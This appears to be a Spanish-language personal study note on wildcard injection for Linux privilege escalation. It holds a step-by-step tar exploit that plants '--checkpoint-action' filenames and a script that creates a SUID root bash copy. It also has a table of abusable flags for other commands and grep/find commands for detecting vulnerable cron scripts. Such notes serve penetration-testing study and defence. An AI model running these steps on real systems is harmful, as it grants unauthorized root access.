---
aliases:
  - "Symlinks"
  - "symlink atack"
  - "Listfiles"
  - "Exploiting Wildcard Injection"
tags:
  - estado/completo
  - env/linux
  - technique/privilege-escalation
kind: Technique
linked:
  - "[[Linux PrivEsc - Cron Jobs]]"
---
# Wildcard Injection

> [!info]
> Comandos con expansión `*` interpretan archivos en cwd como argumentos. Si attacker controla los nombres → inyectar flags maliciosos via filenames especialmente nombrados.

***

## Vulnerable pattern

```bash
# Script ejecutándose como root, en directorio writable
cd /opt/backup
tar czf /backups/$(date +%F).tar.gz *
```

`*` expande a TODOS los files. Si en `/opt/backup` podés crear archivos con nombres tipo `--<flag>` → se procesan como args de tar.

***

## Explotación tar

```bash
cd /opt/backup
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# Cuando cron ejecute tar * → flags interpretados → shell.sh corre como root
# Después:
/tmp/rootbash -p   # SUID bash → root
```

***

## Otros comandos vulnerables

| Comando | Flag abusable |
|---|---|
| **tar** | `--checkpoint-action=exec=cmd` |
| **rsync** | `-e` cmd execution |
| **7z** | `@listfile` para leer files via wildcard |
| **chown / chmod** | `--reference=<file>` |
| **wget** | `--use-askpass` |
| **find** | `-newerXY` con file references |
| **scp** | `-S` script |
| **zip** | `-T --unzip-command` |

GTFOBins lista wildcard abuse: https://gtfobins.github.io/

***

## Detección

```bash
# Buscar scripts root con wildcard
grep -rE 'cd.*\*|tar.*\*|chown.*\*|chmod.*\*' /etc/cron* /opt /usr/local/bin 2>/dev/null

# Y dirs writable por user
find / -writable -type d 2>/dev/null | head -20
```

***

## Notas Relacionadas

- [[Linux PrivEsc - Cron Jobs]]
- [[Linux Privilege Escalation]]
- [[pspy]]
